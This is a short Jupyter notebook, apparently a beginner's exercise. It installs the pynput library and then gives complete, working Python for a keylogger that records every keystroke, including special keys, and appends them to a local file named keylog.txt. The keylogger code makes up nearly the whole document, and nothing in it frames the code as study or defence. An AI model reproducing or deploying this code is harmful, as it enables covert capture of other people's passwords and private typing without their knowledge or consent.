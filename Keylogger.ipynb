{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "b223c4b6-05a7-4aba-8214-1d1a0509c36d",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Obtaining dependency information for pynput from https://files.pythonhosted.org/packages/ef/1d/fdef3fdc9dc8dedc65898c8ad0e8922a914bb89c5308887e45f9aafaec36/pynput-1.7.7-py2.py3-none-any.whl.metadata\n",
      "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
      "Requirement already satisfied: six in c:\\users\\admin\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB 1.4 MB/s eta 0:00:01\n",
      "   ---------------------------------------- 90.2/90.2 kB 1.3 MB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.7\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7acad325-3249-4114-b0ab-bf854c556ea8",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "def on_key_press(key):\n",
    "    # Open the log file in append mode\n",
    "    with open(\"keylog.txt\", 'a') as log_file:\n",
    "        try:\n",
    "            # Try to get the character representation of the key\n",
    "            log_file.write(f\"{key.char}\")\n",
    "        except AttributeError:\n",
    "            # If it's a special key (e.g., Enter, Shift), write the key name\n",
    "            log_file.write(f\"[{key.name}]\")\n",
    "\n",
    "# Start the keyboard listener\n",
    "if __name__ == \"__main__\":\n",
    "    with keyboard.Listener(on_press=on_key_press) as listener:\n",
    "        listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "de09d70c-e139-496d-9a90-c526268c67d5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
